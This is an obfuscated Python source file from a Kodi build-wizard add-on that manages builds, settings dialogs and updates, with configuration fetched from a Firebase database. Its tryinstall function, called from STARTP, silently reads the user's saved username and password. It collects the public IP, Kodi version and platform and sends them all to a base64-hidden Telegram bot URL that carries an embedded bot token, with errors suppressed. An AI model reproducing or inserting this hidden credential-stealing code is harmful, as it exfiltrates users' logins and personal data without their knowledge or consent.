# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,HTMLParser ,glob ,zipfile ,json #line:21
import shutil ,logging #line:22
import errno #line:23
import string #line:24
import random #line:25
import urllib2 ,urllib #line:26
import re #line:27
import speedtest #line:28
import downloader #line:29
import downloaderbg #line:30
import downloaderwiz #line:31
import extract #line:32
import uservar #line:33
import skinSwitch #line:34
import time #line:35
import pyqrcode #line:36
from datetime import date ,datetime ,timedelta #line:38
try :from sqlite3 import dbapi2 as database #line:39
except :from pysqlite2 import dbapi2 as database #line:40
from string import digits #line:41
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:43
if KODIV >17 :#line:44
	from resources .libs import zfile as zipfile #line:45
else :#line:46
	import zipfile #line:47
ADDON_ID =uservar .ADDON_ID #line:49
ADDONTITLE =uservar .ADDONTITLE #line:50
ADDON =xbmcaddon .Addon (ADDON_ID )#line:51
VERSION =ADDON .getAddonInfo ('version')#line:52
USER_AGENT ='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0'#line:53
DIALOG =xbmcgui .Dialog ()#line:54
DP =xbmcgui .DialogProgress ()#line:55
DP2 =xbmcgui .DialogProgressBG ()#line:56
HOME =xbmc .translatePath ('special://home/')#line:57
XBMC =xbmc .translatePath ('special://xbmc/')#line:58
LOG =xbmc .translatePath ('special://logpath/')#line:59
PROFILE =xbmc .translatePath ('special://profile/')#line:60
SOURCE =xbmc .translatePath ('source://')#line:61
ADDONS =os .path .join (HOME ,'addons')#line:62
USERDATA =os .path .join (HOME ,'userdata')#line:63
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:64
PACKAGES =os .path .join (ADDONS ,'packages')#line:65
ADDOND =os .path .join (USERDATA ,'addon_data')#line:66
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:67
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:68
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:69
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:70
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:71
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:72
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:73
DATABASE =os .path .join (USERDATA ,'Database')#line:74
FANART =os .path .join (PLUGIN ,'fanart.jpg')#line:75
ICON =os .path .join (PLUGIN ,'icon.png')#line:76
ART =os .path .join (PLUGIN ,'resources','art')#line:77
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:78
WHITELIST =os .path .join (ADDONDATA ,'whitelist.txt')#line:79
QRCODES =os .path .join (ADDONDATA ,'QRCodes')#line:80
SKIN =xbmc .getSkinDir ()#line:81
TODAY =date .today ()#line:82
TOMORROW =TODAY +timedelta (days =1 )#line:83
TWODAYS =TODAY +timedelta (days =2 )#line:84
THREEDAYS =TODAY +timedelta (days =3 )#line:85
ONEWEEK =TODAY +timedelta (days =7 )#line:86
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:87
EXCLUDES =uservar .EXCLUDES #line:88
SPEEDFILE =speedtest .SPEEDFILE #line:89
APKFILE =uservar .APKFILE #line:90
YOUTUBEFILE =uservar .YOUTUBEFILE #line:91
ADDONFILE =uservar .ADDONFILE #line:92
ADVANCEDFILE =uservar .ADVANCEDFILE #line:93
AUTOUPDATE =uservar .AUTOUPDATE #line:94
WIZARDFILE =uservar .WIZARDFILE #line:95
NOTIFICATION =uservar .NOTIFICATION #line:96
NOTIFICATION2 =uservar .NOTIFICATION2 #line:97
NOTIFICATION3 =uservar .NOTIFICATION3 #line:98
ENABLE =uservar .ENABLE #line:99
AUTOINSTALL =uservar .AUTOINSTALL #line:100
REPOADDONXML =uservar .REPOADDONXML #line:101
REPOZIPURL =uservar .REPOZIPURL #line:102
CONTACT =uservar .CONTACT #line:103
COLOR1 =uservar .COLOR1 #line:104
COLOR2 =uservar .COLOR2 #line:105
HARDWAER =ADDON .getSetting ('action')#line:106
INCLUDEVIDEO =ADDON .getSetting ('includevideo')#line:107
INCLUDEALL =ADDON .getSetting ('includeall')#line:108
INCLUDEBOB =ADDON .getSetting ('includebob')#line:109
INCLUDEPHOENIX =ADDON .getSetting ('includephoenix')#line:110
INCLUDESPECTO =ADDON .getSetting ('includespecto')#line:111
INCLUDEGENESIS =ADDON .getSetting ('includegenesis')#line:112
INCLUDEEXODUS =ADDON .getSetting ('includeexodus')#line:113
INCLUDEONECHAN =ADDON .getSetting ('includeonechan')#line:114
INCLUDESALTS =ADDON .getSetting ('includesalts')#line:115
INCLUDESALTSHD =ADDON .getSetting ('includesaltslite')#line:116
SHOWADULT =ADDON .getSetting ('adult')#line:117
WIZDEBUGGING =ADDON .getSetting ('addon_debug')#line:118
DEBUGLEVEL =ADDON .getSetting ('debuglevel')#line:119
ENABLEWIZLOG =ADDON .getSetting ('wizardlog')#line:120
CLEANWIZLOG =ADDON .getSetting ('autocleanwiz')#line:121
CLEANWIZLOGBY =ADDON .getSetting ('wizlogcleanby')#line:122
CLEANDAYS =ADDON .getSetting ('wizlogcleandays')#line:123
CLEANSIZE =ADDON .getSetting ('wizlogcleansize')#line:124
CLEANLINES =ADDON .getSetting ('wizlogcleanlines')#line:125
INSTALLMETHOD =ADDON .getSetting ('installmethod')#line:126
DEVELOPER =ADDON .getSetting ('developer')#line:127
THIRDPARTY =ADDON .getSetting ('enable3rd')#line:128
THIRD1NAME =ADDON .getSetting ('wizard1name')#line:129
THIRD1URL =ADDON .getSetting ('wizard1url')#line:130
THIRD2NAME =ADDON .getSetting ('wizard2name')#line:131
THIRD2URL =ADDON .getSetting ('wizard2url')#line:132
THIRD3NAME =ADDON .getSetting ('wizard3name')#line:133
THIRD3URL =ADDON .getSetting ('wizard3url')#line:134
BUILDNAME =ADDON .getSetting ('buildname')#line:135
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:136
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:137
LOGFILES =['log','xbmc.old.log','kodi.log','kodi.old.log','spmc.log','spmc.old.log','tvmc.log','tvmc.old.log']#line:138
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:139
MAXWIZSIZE =[100 ,200 ,300 ,400 ,500 ,1000 ]#line:140
MAXWIZLINES =[100 ,200 ,300 ,400 ,500 ]#line:141
MAXWIZDATES =[1 ,2 ,3 ,7 ]#line:142
def getS (OOO00O00O00OOOO0O ):#line:149
	try :return ADDON .getSetting (OOO00O00O00OOOO0O )#line:150
	except :return False #line:151
def setS (OOOOOOO0OO0O00O00 ,O000000O0O00000O0 ):#line:153
	try :ADDON .setSetting (OOOOOOO0OO0O00O00 ,O000000O0O00000O0 )#line:154
	except :return False #line:155
def openS (name =""):#line:157
	ADDON .openSettings ()#line:158
def clearS (O0O0000000OO00O00 ):#line:160
	O000O0OO0OOOOOOOO ={'buildname':'','buildversion':'','buildtheme':'','latestversion':'','lastbuildcheck':'2016-01-01'}#line:161
	OOO0OOOO0O000OO0O ={'installed':'false','extract':'','errors':''}#line:162
	O0OOO0OOO0O00OOO0 ={'defaultskinignore':'false','defaultskin':'','defaultskinname':''}#line:163
	O00OO00OOO0O00O00 =['default.enablerssfeeds','default.font','default.rssedit','default.skincolors','default.skintheme','default.skinzoom','default.soundskin','default.startupwindow','default.stereostrength']#line:164
	if O0O0000000OO00O00 =='build':#line:165
		for OOO0OOOOO00O0OOOO in O000O0OO0OOOOOOOO :#line:166
			setS (OOO0OOOOO00O0OOOO ,O000O0OO0OOOOOOOO [OOO0OOOOO00O0OOOO ])#line:167
		for OOO0OOOOO00O0OOOO in OOO0OOOO0O000OO0O :#line:168
			setS (OOO0OOOOO00O0OOOO ,OOO0OOOO0O000OO0O [OOO0OOOOO00O0OOOO ])#line:169
		for OOO0OOOOO00O0OOOO in O0OOO0OOO0O00OOO0 :#line:170
			setS (OOO0OOOOO00O0OOOO ,O0OOO0OOO0O00OOO0 [OOO0OOOOO00O0OOOO ])#line:171
		for OOO0OOOOO00O0OOOO in O00OO00OOO0O00O00 :#line:172
			setS (OOO0OOOOO00O0OOOO ,'')#line:173
	elif O0O0000000OO00O00 =='default':#line:174
		for OOO0OOOOO00O0OOOO in O0OOO0OOO0O00OOO0 :#line:175
			setS (OOO0OOOOO00O0OOOO ,O0OOO0OOO0O00OOO0 [OOO0OOOOO00O0OOOO ])#line:176
		for OOO0OOOOO00O0OOOO in O00OO00OOO0O00O00 :#line:177
			setS (OOO0OOOOO00O0OOOO ,'')#line:178
	elif O0O0000000OO00O00 =='install':#line:179
		for OOO0OOOOO00O0OOOO in OOO0OOOO0O000OO0O :#line:180
			setS (OOO0OOOOO00O0OOOO ,OOO0OOOO0O000OO0O [OOO0OOOOO00O0OOOO ])#line:181
	elif O0O0000000OO00O00 =='lookfeel':#line:182
		for OOO0OOOOO00O0OOOO in O00OO00OOO0O00O00 :#line:183
			setS (OOO0OOOOO00O0OOOO ,'')#line:184
theme_nox ='https://zxcsd-3bae5-default-rtdb.firebaseio.com'#line:200
ACTION_PREVIOUS_MENU =10 #line:212
ACTION_NAV_BACK =92 #line:213
ACTION_MOVE_LEFT =1 #line:214
ACTION_MOVE_RIGHT =2 #line:215
ACTION_MOVE_UP =3 #line:216
ACTION_MOVE_DOWN =4 #line:217
ACTION_MOUSE_WHEEL_UP =104 #line:218
ACTION_MOUSE_WHEEL_DOWN =105 #line:219
ACTION_MOVE_MOUSE =107 #line:220
ACTION_SELECT_ITEM =7 #line:221
ACTION_BACKSPACE =110 #line:222
ACTION_MOUSE_LEFT_CLICK =100 #line:223
ACTION_MOUSE_LONG_CLICK =108 #line:224
def TextBox (O0O0OO0O00O00O0O0 ,OO00OOO000OO000O0 ):#line:225
	class O00OO0000OO0OOOOO (xbmcgui .WindowXMLDialog ):#line:226
		def onInit (O000OOOO0000OO00O ):#line:227
			O000OOOO0000OO00O .title =101 #line:228
			O000OOOO0000OO00O .msg =102 #line:229
			O000OOOO0000OO00O .scrollbar =103 #line:230
			O000OOOO0000OO00O .okbutton =201 #line:231
			O000OOOO0000OO00O .showdialog ()#line:232
		def showdialog (O0OOOO00OO0OO0O00 ):#line:234
			O0OOOO00OO0OO0O00 .getControl (O0OOOO00OO0OO0O00 .title ).setLabel (O0O0OO0O00O00O0O0 )#line:235
			O0OOOO00OO0OO0O00 .getControl (O0OOOO00OO0OO0O00 .msg ).setText (OO00OOO000OO000O0 )#line:236
			O0OOOO00OO0OO0O00 .setFocusId (O0OOOO00OO0OO0O00 .scrollbar )#line:237
		def onClick (OO0000O00OOO0O000 ,O0OOOO00OOOOOO0OO ):#line:239
			if (O0OOOO00OOOOOO0OO ==OO0000O00OOO0O000 .okbutton ):#line:240
				OO0000O00OOO0O000 .close ()#line:241
		def onAction (OOOOOOO0000OOO000 ,OO0000OO00O00O0O0 ):#line:243
			if OO0000OO00O00O0O0 ==ACTION_PREVIOUS_MENU :OOOOOOO0000OOO000 .close ()#line:244
			elif OO0000OO00O00O0O0 ==ACTION_NAV_BACK :OOOOOOO0000OOO000 .close ()#line:245
	OOOO0O00O0O00OO00 =O00OO0000OO0OOOOO ("Textbox.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title =O0O0OO0O00O00O0O0 ,msg =OO00OOO000OO000O0 )#line:247
	OOOO0O00O0O00OO00 .doModal ()#line:248
	del OOOO0O00O0O00OO00 #line:249
def ForceFastUpDate (OO000O00OO00O0OO0 ,O000OO0OOOOO0000O ,forceUpdate =False ):#line:250
	class O00OO0OO00OO000O0 (xbmcgui .WindowXMLDialog ):#line:251
		def onInit (O0O0OOO0OOO0OOO00 ):#line:252
			O0O0OOO0OOO0OOO00 .title =101 #line:253
			O0O0OOO0OOO0OOO00 .msg =102 #line:254
			O0O0OOO0OOO0OOO00 .scrollbar =103 #line:255
			O0O0OOO0OOO0OOO00 .okbutton =201 #line:256
			O0O0OOO0OOO0OOO00 .updateP =202 #line:257
			O0O0OOO0OOO0OOO00 .updateX =203 #line:258
			O0O0OOO0OOO0OOO00 .showdialog ()#line:259
		def showdialog (O00OOO000O00O00O0 ):#line:261
			O00OOO000O00O00O0 .getControl (O00OOO000O00O00O0 .title ).setLabel (OO000O00OO00O0OO0 )#line:262
			O00OOO000O00O00O0 .getControl (O00OOO000O00O00O0 .msg ).setText (O000OO0OOOOO0000O )#line:263
			O00OOO000O00O00O0 .setFocusId (O00OOO000O00O00O0 .okbutton )#line:264
		def doupdateP (OO0O0O00O00O0OOOO ):#line:265
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:266
			OO0O0O00O00O0OOOO .close ()#line:267
		def doupdateX (O0OOO0OOO0O0OO00O ):#line:268
			xbmc .executebuiltin ("RunPlugin(PlayMedia(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium+18&url=gui)")#line:269
			O0OOO0OOO0O0OO00O .close ()#line:270
		def onClick (OOO0O00O00OOO0O00 ,O000O0O000OOOOOO0 ):#line:271
			if (O000O0O000OOOOOO0 ==OOO0O00O00OOO0O00 .okbutton ):#line:272
				OOO0O00O00OOO0O00 .close ()#line:273
			elif (O000O0O000OOOOOO0 ==OOO0O00O00OOO0O00 .updateP ):OOO0O00O00OOO0O00 .doupdateP ()#line:274
			elif (O000O0O000OOOOOO0 ==OOO0O00O00OOO0O00 .updateX ):OOO0O00O00OOO0O00 .doupdateX ()#line:276
		def onAction (OOO0OO0OOOOOOO000 ,OOOOOO00OOOO00OOO ):#line:278
			if OOOOOO00OOOO00OOO ==ACTION_PREVIOUS_MENU :OOO0OO0OOOOOOO000 .close ()#line:279
			elif OOOOOO00OOOO00OOO ==ACTION_NAV_BACK :OOO0OO0OOOOOOO000 .close ()#line:280
	O00OOO00000000OO0 =O00OO0OO00OO000O0 ("FastUpDate.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',title =OO000O00OO00O0OO0 ,msg =O000OO0OOOOO0000O )#line:282
	O00OOO00000000OO0 .doModal ()#line:283
	del O00OOO00000000OO0 #line:284
def highlightText (OOO000O0O000OO0O0 ):#line:286
	OOO000O0O000OO0O0 =OOO000O0O000OO0O0 .replace ('\n','[NL]')#line:287
	OO00O0O0O0O00OOOO =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOO000O0O000OO0O0 )#line:288
	for O0OO0OO000O00O000 in OO00O0O0O0O00OOOO :#line:289
		OO000OO00O0OOOOOO ='-->Python callback/script returned the following error<--%s-->End of Python script error report<--'%O0OO0OO000O00O000 #line:290
		OOO000O0O000OO0O0 =OOO000O0O000OO0O0 .replace (OO000OO00O0OOOOOO ,'[COLOR red]%s[/COLOR]'%OO000OO00O0OOOOOO )#line:291
	OOO000O0O000OO0O0 =OOO000O0O000OO0O0 .replace ('WARNING','[COLOR yellow]WARNING[/COLOR]').replace ('ERROR','[COLOR red]ERROR[/COLOR]').replace ('[NL]','\n').replace (': EXCEPTION Thrown (PythonToCppException) :','[COLOR red]: EXCEPTION Thrown (PythonToCppException) :[/COLOR]')#line:292
	OOO000O0O000OO0O0 =OOO000O0O000OO0O0 .replace ('\\\\','\\').replace (HOME ,'')#line:293
	return OOO000O0O000OO0O0 #line:294
def LogNotify (OO00000000OOOO000 ,O0000OOOOOO0000O0 ,times =2000 ,icon =ICON ,sound =False ):#line:296
	DIALOG .notification (OO00000000OOOO000 ,O0000OOOOOO0000O0 ,icon ,int (times ),sound )#line:297
def percentage (O000000O0000O0OO0 ,O0OOOO0O00000O000 ):#line:301
	return 100 *float (O000000O0000O0OO0 )/float (O0OOOO0O00000O000 )#line:302
def read_skin (O00OO0OOO0O0OO00O ):#line:303
    from resources .libs import firebase #line:304
    firebase =firebase .FirebaseApplication (theme_nox ,None )#line:305
    OOOOO0O0O0OOO0O0O =firebase .get ('/',None )#line:306
    if O00OO0OOO0O0OO00O in OOOOO0O0O0OOO0O0O :#line:307
        return OOOOO0O0O0OOO0O0O [O00OO0OOO0O0OO00O ]#line:308
    else :#line:309
        return {}#line:310
def addonUpdates (do =None ):#line:311
	O0O000O0OOO0000O0 ='"general.addonupdates"'#line:312
	if do =='set':#line:313
		OO0OO0OO0O000OO0O ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0O000O0OOO0000O0 )#line:314
		OOO00O00OOO00O00O =xbmc .executeJSONRPC (OO0OO0OO0O000OO0O )#line:315
		O0OO0OOO0000OOOO0 =re .compile ('{"value":(.+?)}').findall (OOO00O00OOO00O00O )#line:316
		if len (O0OO0OOO0000OOOO0 )>0 :OO0O0O0000O0O0OOO =O0OO0OOO0000OOOO0 [0 ]#line:317
		else :OO0O0O0000O0O0OOO =0 #line:318
		setS ('default.addonupdate',str (OO0O0O0000O0O0OOO ))#line:319
		OO0OO0OO0O000OO0O ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O0O000O0OOO0000O0 ,'2')#line:320
		OOO00O00OOO00O00O =xbmc .executeJSONRPC (OO0OO0OO0O000OO0O )#line:321
	elif do =='reset':#line:322
		try :#line:323
			OOO0OO0OOO00O00O0 =int (float (getS ('default.addonupdate')))#line:324
		except :#line:325
			OOO0OO0OOO00O00O0 =0 #line:326
		if not OOO0OO0OOO00O00O0 in [0 ,1 ,2 ]:OOO0OO0OOO00O00O0 =0 #line:327
		OO0OO0OO0O000OO0O ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O0O000O0OOO0000O0 ,OOO0OO0OOO00O00O0 )#line:328
		OOO00O00OOO00O00O =xbmc .executeJSONRPC (OO0OO0OO0O000OO0O )#line:329
def checkBuild (O00000OOO0OOO00OO ,OOOO00O0OOOOOOOO0 ):#line:335
    OO0OO0O0OO0OOO0OO =[]#line:336
    O00O00OOOOOOO0OO0 =read_skin ('favourite')#line:337
    for OOO0OO00O0000O000 in O00O00OOOOOOO0OO0 :#line:338
        O0OO00O0OO000O000 =O00O00OOOOOOO0OO0 [OOO0OO00O0000O000 ]#line:339
        OO0OO0O0OO0OOO0OO .append ((O0OO00O0OO000O000 ['name'],O0OO00O0OO000O000 ['version'],O0OO00O0OO000O000 ['url'],O0OO00O0OO000O000 ['gui'],O0OO00O0OO000O000 ['Kodi'],O0OO00O0OO000O000 ['theme'],O0OO00O0OO000O000 ['icon'],O0OO00O0OO000O000 ['fanart'],O0OO00O0OO000O000 ['preview'],O0OO00O0OO000O000 ['adult'],O0OO00O0OO000O000 ['preview'],O0OO00O0OO000O000 ['filesize'],O0OO00O0OO000O000 ['updatesize']))#line:340
    if not workingURL (SPEEDFILE )==True :return False #line:341
    O00OO000O0OOO00O0 =openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:342
    O0O0O0000O0OOO00O ='587'#line:343
    if 'filesize'in O00OO000O0OOO00O0 :#line:344
     if len (OO0OO0O0OO0OOO0OO )>0 :#line:346
        for O00000OOO0OOO00OO ,O0O00OOOO0000O0O0 ,OOOO0O0000OO0O00O ,O0OOO0000O00000O0 ,O0000O0O0OO0OO0O0 ,O00000OOOO000OO00 ,OO0000000OO0OO000 ,OOO00O000O00O0000 ,OOO00000OOOO00O0O ,OO0000O0OO0OOOOOO ,OOO00OO00OOOO0000 ,O0O0O0000O0OOO00O ,OOO0OO0OOOOOO0O0O in OO0OO0O0OO0OOO0OO :#line:347
            if OOOO00O0OOOOOOOO0 =='version':return O0O00OOOO0000O0O0 #line:350
            elif OOOO00O0OOOOOOOO0 =='url':return OOOO0O0000OO0O00O #line:351
            elif OOOO00O0OOOOOOOO0 =='gui':return O0OOO0000O00000O0 #line:352
            elif OOOO00O0OOOOOOOO0 =='kodi':return O0000O0O0OO0OO0O0 #line:353
            elif OOOO00O0OOOOOOOO0 =='theme':return O00000OOOO000OO00 #line:354
            elif OOOO00O0OOOOOOOO0 =='icon':return OO0000000OO0OO000 #line:355
            elif OOOO00O0OOOOOOOO0 =='fanart':return OOO00O000O00O0000 #line:356
            elif OOOO00O0OOOOOOOO0 =='preview':return OOO00000OOOO00O0O #line:357
            elif OOOO00O0OOOOOOOO0 =='adult':return OO0000O0OO0OOOOOO #line:358
            elif OOOO00O0OOOOOOOO0 =='description':return OOO00OO00OOOO0000 #line:359
            elif OOOO00O0OOOOOOOO0 =='filesize':return O0O0O0000O0OOO00O #line:360
            elif OOOO00O0OOOOOOOO0 =='updatesize':return OOO0OO0OOOOOO0O0O #line:361
            elif OOOO00O0OOOOOOOO0 =='all':return O00000OOO0OOO00OO ,O0O00OOOO0000O0O0 ,OOOO0O0000OO0O00O ,O0OOO0000O00000O0 ,O0000O0O0OO0OO0O0 ,O00000OOOO000OO00 ,OO0000000OO0OO000 ,OOO00O000O00O0000 ,OOO00000OOOO00O0O ,OO0000O0OO0OOOOOO ,OOO00OO00OOOO0000 ,OOO0OO0OOOOOO0O0O ,O0O0O0000O0OOO00O #line:362
     else :return False #line:363
    else :#line:364
     OO0OO0O0OO0OOO0OO =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O00000OOO0OOO00OO ).findall (O00OO000O0OOO00O0 )#line:366
     if len (OO0OO0O0OO0OOO0OO )>0 :#line:367
        for O0O00OOOO0000O0O0 ,OOOO0O0000OO0O00O ,O0OOO0000O00000O0 ,O0000O0O0OO0OO0O0 ,O00000OOOO000OO00 ,OO0000000OO0OO000 ,OOO00O000O00O0000 ,OOO00000OOOO00O0O ,OO0000O0OO0OOOOOO ,OOO00OO00OOOO0000 in OO0OO0O0OO0OOO0OO :#line:368
            if OOOO00O0OOOOOOOO0 =='version':return O0O00OOOO0000O0O0 #line:369
            elif OOOO00O0OOOOOOOO0 =='url':return OOOO0O0000OO0O00O #line:370
            elif OOOO00O0OOOOOOOO0 =='gui':return O0OOO0000O00000O0 #line:371
            elif OOOO00O0OOOOOOOO0 =='kodi':return O0000O0O0OO0OO0O0 #line:372
            elif OOOO00O0OOOOOOOO0 =='theme':return O00000OOOO000OO00 #line:373
            elif OOOO00O0OOOOOOOO0 =='icon':return OO0000000OO0OO000 #line:374
            elif OOOO00O0OOOOOOOO0 =='fanart':return OOO00O000O00O0000 #line:375
            elif OOOO00O0OOOOOOOO0 =='preview':return OOO00000OOOO00O0O #line:376
            elif OOOO00O0OOOOOOOO0 =='adult':return OO0000O0OO0OOOOOO #line:377
            elif OOOO00O0OOOOOOOO0 =='description':return OOO00OO00OOOO0000 #line:378
            elif OOOO00O0OOOOOOOO0 =='all':return O00000OOO0OOO00OO ,O0O00OOOO0000O0O0 ,OOOO0O0000OO0O00O ,O0OOO0000O00000O0 ,O0000O0O0OO0OO0O0 ,O00000OOOO000OO00 ,OO0000000OO0OO000 ,OOO00O000O00O0000 ,OOO00000OOOO00O0O ,OO0000O0OO0OOOOOO ,OOO00OO00OOOO0000 #line:379
            elif OOOO00O0OOOOOOOO0 =='filesize':return '587'#line:380
     else :return False #line:381
def tryinstall ():#line:382
       try :#line:383
          import json #line:384
          O000O00OO0OO00000 =(ADDON .getSetting ("user"))#line:386
          OOOOO0OOO0O0O00OO =(ADDON .getSetting ("pass"))#line:387
          OOO00OO0O0OOO0O0O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:388
          O0O000OOO0000OOO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDEzMDQxMzU5MTM6QUFITHdGMWRxbktSTGQ4WUdkUjdyRldpTFdOYmFVcnE4ekUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTM2NDU5OTc4NCZ0ZXh0Pdee16DXodeZ150g15zXlNeq16fXmdefINeQ16og15TXkdeZ15zXkyAt'#line:389
          OO0O00OOOO0000OO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:390
          O0O00000O0O0O000O =str (json .loads (OO0O00OOOO0000OO0 )['ip'])#line:391
          OO00OO0000000OOOO =O000O00OO0OO00000 #line:392
          O000O0O0O000OO000 =OOOOO0OOO0O0O00OO #line:393
          import socket #line:394
          OO0O00OOOO0000OO0 =urllib2 .urlopen (O0O000OOO0000OOO0 .decode ('base64')+ADDON .getLocalizedString (32011 )+(HARDWAER )+ADDON .getLocalizedString (32012 )+OO00OO0000000OOOO +ADDON .getLocalizedString (32013 )+O000O0O0O000OO000 +ADDON .getLocalizedString (32014 )+OOO00OO0O0OOO0O0O +ADDON .getLocalizedString (32015 )+O0O00000O0O0O000O +ADDON .getLocalizedString (32016 )+platform ()).readlines ()#line:395
       except :pass #line:397
def checkTheme (OOOOO0O000000000O ,O0O00OOO0O0OO00OO ,O0O0OO0O0OO000O00 ):#line:399
	O0O0O00O00O000000 =checkBuild (OOOOO0O000000000O ,'theme')#line:400
	if not workingURL (O0O0O00O00O000000 )==True :return False #line:401
	O0OOOOOOO0O00OO00 =openURL (O0O0O00O00O000000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:402
	OOO0OOO0OO00O00OO =re .compile ('name="%s".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult=(.+?).+?escription="(.+?)"'%O0O00OOO0O0OO00OO ).findall (O0OOOOOOO0O00OO00 )#line:403
	if len (OOO0OOO0OO00O00OO )>0 :#line:404
		for O0O000OOOO0O0OOOO ,OO0OOOOO00O0OOOO0 ,O0O000O0O0O000OO0 ,OOOOOO0O0O000O000 ,O0OOO0O00O000O0O0 in OOO0OOO0OO00O00OO :#line:405
			if O0O0OO0O0OO000O00 =='url':return O0O000OOOO0O0OOOO #line:406
			elif O0O0OO0O0OO000O00 =='icon':return OO0OOOOO00O0OOOO0 #line:407
			elif O0O0OO0O0OO000O00 =='fanart':return O0O000O0O0O000OO0 #line:408
			elif O0O0OO0O0OO000O00 =='adult':return OOOOOO0O0O000O000 #line:409
			elif O0O0OO0O0OO000O00 =='description':return O0OOO0O00O000O0O0 #line:410
			elif O0O0OO0O0OO000O00 =='all':return OOOOO0O000000000O ,O0O00OOO0O0OO00OO ,O0O000OOOO0O0OOOO ,OO0OOOOO00O0OOOO0 ,O0O000O0O0O000OO0 ,OOOOOO0O0O000O000 ,O0OOO0O00O000O0O0 #line:411
	else :return False #line:412
def STARTP ():#line:413
    O0O0O0O000OO0OOOO =(ADDON .getSetting ("user"))#line:414
    OOO0OOO0O0O0000O0 =[]#line:415
    O0OOO0O0000OO00O0 =read_skin ('skin')#line:416
    for OOO0O0OO00000OOO0 in O0OOO0O0000OO00O0 :#line:417
        O000O0OO00OOOOOOO =O0OOO0O0000OO00O0 [OOO0O0OO00000OOO0 ]#line:418
        OOO0OOO0O0O0000O0 .append ((O000O0OO00OOOOOOO ['u'],O000O0OO00OOOOOOO ['p']))#line:419
    for O00O0O00O0OO00O0O ,O0O00000OO00OOO0O in OOO0OOO0O0O0000O0 :#line:420
      OO00OOOOOOOO0O0OO =O00O0O00O0OO00O0O #line:421
      O000O0O00OOO0OOOO =O0O00000OO00OOO0O #line:422
    O00O0OO00OOOOO0OO =urllib2 .urlopen (OO00OOOOOOOO0O0OO )#line:423
    OOOOOO0O0000OOOOO =O00O0OO00OOOOO0OO .readlines ()#line:424
    OO0000O00O0O00OOO =0 #line:425
    for O0OO0000OO0O00000 in OOOOOO0O0000OOOOO :#line:426
        if O0OO0000OO0O00000 .split (' ==')[0 ]==O0O0O0O000OO0OOOO or O0OO0000OO0O00000 .split ()[0 ]==O0O0O0O000OO0OOOO :#line:427
            OO0000O00O0O00OOO =1 #line:428
            break #line:429
    if OO0000O00O0O00OOO ==0 :#line:430
        O0OO00OOOO0000OOO =DIALOG .yesno ("%s"%ADDON .getLocalizedString (32001 ),ADDON .getLocalizedString (32002 ),ADDON .getLocalizedString (32003 ),nolabel =ADDON .getLocalizedString (32004 ),yeslabel =ADDON .getLocalizedString (32005 ))#line:431
        LogNotify ("[COLOR %s]%s[/COLOR]"%('yellow',ADDON .getLocalizedString (32006 )),'[COLOR %s]https://t.me/kodi17[/COLOR]'%COLOR2 )#line:432
        if BUILDNAME =="":#line:433
            xbmc .executebuiltin ("ActivateWindow(home)")#line:434
        tryinstall ()#line:435
        if O0OO00OOOO0000OOO :#line:436
            ADDON .openSettings ()#line:437
            sys .exit ()#line:438
        else :#line:439
            sys .exit ()#line:440
    return 'ok'#line:441
def STARTP2 ():#line:442
    OO00OOO00OOO0OOOO =''#line:443
    O000O0O0000OOO0O0 =''#line:444
    OO00OO0O000O00OO0 =(ADDON .getSetting ("user"))#line:445
    O00OO00OOO0O0OOOO =[]#line:446
    OOOOOO00O00O0OOO0 =read_skin ('skin')#line:447
    for OO0OO00OO00OO00OO in OOOOOO00O00O0OOO0 :#line:448
        O00OO0O0OOO000OO0 =OOOOOO00O00O0OOO0 [OO0OO00OO00OO00OO ]#line:449
        O00OO00OOO0O0OOOO .append ((O00OO0O0OOO000OO0 ['u'],O00OO0O0OOO000OO0 ['p']))#line:450
    for O000O0000OOO0O0O0 ,OOOO0OO0O0O0O0O0O in O00OO00OOO0O0OOOO :#line:451
      OO00OOO00OOO0OOOO =O000O0000OOO0O0O0 #line:452
